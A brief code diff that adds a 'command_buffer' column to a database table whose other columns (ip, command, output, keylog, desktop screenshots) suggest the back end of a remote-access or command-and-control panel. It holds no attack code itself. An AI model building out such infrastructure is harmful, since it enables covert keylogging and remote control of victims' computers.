@@ -17,6 +17,7 @@ try {
             name VARCHAR(255) NOT NULL,
             ip VARCHAR(50) NOT NULL,
             command TEXT,
+            command_buffer TEXT,
             output TEXT,
             keylog TEXT,
             desktop LONGBLOB,
